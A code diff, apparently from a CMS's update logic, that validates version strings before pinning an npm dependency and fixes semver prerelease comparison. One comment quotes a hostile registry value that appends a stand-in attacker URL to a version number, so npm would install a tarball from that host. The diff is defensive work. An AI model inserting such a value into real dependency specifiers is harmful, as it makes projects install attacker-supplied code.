@@ -54,11 +54,59 @@ export function strandsOwner(version: string): boolean {
   return compareVersions(version, SELF_UPDATE_SINCE) < 0;
 }
 
+// A published version number, anchored at BOTH ends. The anchors are the whole
+// point: this string becomes the VALUE of dependencies["lanza-site"], and npm
+// reads that as a dependency SPECIFIER, not as a number. Proven with a hostile
+// registry response —
+//   "0.1.6 || https://evil.example/p.tgz"
+// compares as newer than 0.1.5, clears the `critical` floor, and npm then installs
+// the package from that URL. No tarball is ever published, so provenance has
+// nothing to catch. JSON.stringify already escapes the value, so this is not JSON
+// injection; the injection is semantic, into npm's dependency grammar.
+//
+// Duplicated in the broker (lanza-broker/functions/_lib/fanout.ts) for the same
+// reason the comparator is — separate deployables, no shared package.
+const SEMVER_RE = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/;
+
+/** Is this a version number we are willing to write into a package.json? */
+export function isVersion(v: unknown): v is string {
+  return typeof v === "string" && SEMVER_RE.test(v);
+}
+
+// Prerelease identifiers, compared per semver §11: dot-separated, numeric ones
+// numerically, numeric sorts below alphanumeric, and a shorter set sorts below a
+// longer one with the same prefix. String comparison alone got `rc.10` below
+// `rc.9` — the same lexical trap the 0.1.10 tests below already pin for the
+// numeric segments.
+function comparePrerelease(a: string, b: string): number {
+  const as = a.split(".");
+  const bs = b.split(".");
+  for (let i = 0; i < Math.max(as.length, bs.length); i++) {
+    const x = as[i];
+    const y = bs[i];
+    if (x === undefined) return -1;
+    if (y === undefined) return 1;
+    const xNum = /^\d+$/.test(x);
+    const yNum = /^\d+$/.test(y);
+    if (xNum && yNum) {
+      const d = Number(x) - Number(y);
+      if (d !== 0) return d < 0 ? -1 : 1;
+    } else if (xNum !== yNum) {
+      return xNum ? -1 : 1;
+    } else if (x !== y) {
+      return x < y ? -1 : 1;
+    }
+  }
+  return 0;
+}
+
 /** Compare two dotted numeric versions. -1 / 0 / 1, like a sort comparator. */
 export function compareVersions(a: string, b: string): number {
   // Prerelease suffixes (1.2.3-beta.1) sort BEFORE their release, per semver.
-  const [aMain, aPre] = a.split("-", 2);
-  const [bMain, bPre] = b.split("-", 2);
+  // split(/-(.*)/) keeps the WHOLE suffix; split("-", 2) dropped everything past
+  // the first hyphen, so 1.0.0-beta-1 and 1.0.0-beta-2 compared EQUAL.
+  const [aMain, aPre = ""] = a.split(/-(.*)/);
+  const [bMain, bPre = ""] = b.split(/-(.*)/);
   const an = aMain.split(".").map((n) => parseInt(n, 10) || 0);
   const bn = bMain.split(".").map((n) => parseInt(n, 10) || 0);
   for (let i = 0; i < Math.max(an.length, bn.length); i++) {
@@ -67,15 +115,27 @@ export function compareVersions(a: string, b: string): number {
   }
   if (aPre && !bPre) return -1;
   if (!aPre && bPre) return 1;
-  if (aPre && bPre && aPre !== bPre) return aPre < bPre ? -1 : 1;
+  if (aPre && bPre) return comparePrerelease(aPre, bPre);
   return 0;
 }
 
-/** The pinned version string, with any range prefix stripped (we pin exact). */
+/**
+ * The pinned version string, or null when this repo does not track a released
+ * version of the package. A range prefix is stripped (we pin exact) and so is a
+ * leading `v` — `v1.0.0` otherwise parsed to [0,0,0] and read as ancient.
+ *
+ * Anything that is not a version number after that — `file:../lanza`, a git URL,
+ * `*`, `latest` — is deliberately null, i.e. UNMANAGED. It is a self-hoster or a
+ * fork, not a site on a release, and the old code judged it version 0: below every
+ * floor, so the CMS nagged and the broker's fan-out force-rewrote it. Reporting
+ * "not updatable" is both true and what the broker now does (fanout.ts verdictFor).
+ */
 function pinnedVersion(pkg: Record<string, unknown>): string | null {
   const deps = pkg.dependencies as Record<string, string> | undefined;
   const raw = deps?.[PACKAGE_NAME];
-  return raw ? raw.replace(/^[\^~>=<\s]+/, "") : null;
+  if (typeof raw !== "string") return null;
+  const cleaned = raw.replace(/^[\^~>=<\s]+/, "").replace(/^v/, "");
+  return isVersion(cleaned) ? cleaned : null;
 }
 
 async function readPin(client: GitHubClient, ref: string): Promise<string | null> {
@@ -99,10 +159,19 @@ export async function fetchRegistry(): Promise<RegistryInfo> {
     time?: Record<string, string>;
   };
   const tags = doc["dist-tags"] ?? {};
+  // Filter at the boundary: every key of `doc.versions` becomes a clickable Update
+  // button and `latest`/`critical` drive the offer and the floor. A malformed tag
+  // must read as ABSENT, not as a version — absent means no offer and no floor,
+  // which is already the safe default everywhere below. See isVersion.
   const releases = Object.keys(doc.versions ?? {})
+    .filter(isVersion)
     .sort((a, b) => compareVersions(b, a))
     .map((version) => ({ version, date: doc.time?.[version] ?? null }));
-  return { latest: tags.latest ?? "", critical: tags.critical ?? null, releases };
+  return {
+    latest: isVersion(tags.latest) ? tags.latest : "",
+    critical: isVersion(tags.critical) ? tags.critical : null,
+    releases,
+  };
 }
 
 export async function loadVersionState(client: GitHubClient): Promise<VersionState> {
@@ -200,6 +269,14 @@ export async function refreshVersionState(client: GitHubClient): Promise<void> {
  * what makes Cloudflare rebuild onto the new code.
  */
 export async function setPinnedVersion(client: GitHubClient, version: string): Promise<void> {
+  // Last gate before the write. fetchRegistry already filters, but this is the
+  // function that puts a string into npm's dependency grammar, so it checks for
+  // itself rather than trusting its caller — the value may have come from a
+  // registry response, a route param or a future caller that has no idea.
+  if (!isVersion(version)) {
+    throw new Error(`Refusing to pin ${PACKAGE_NAME} to "${version}" — not a version number.`);
+  }
+
   const { data, sha } = await client.loadJson("package.json", REPO.branch);
   const deps = (data.dependencies ?? {}) as Record<string, string>;
   if (deps[PACKAGE_NAME] === version) return;
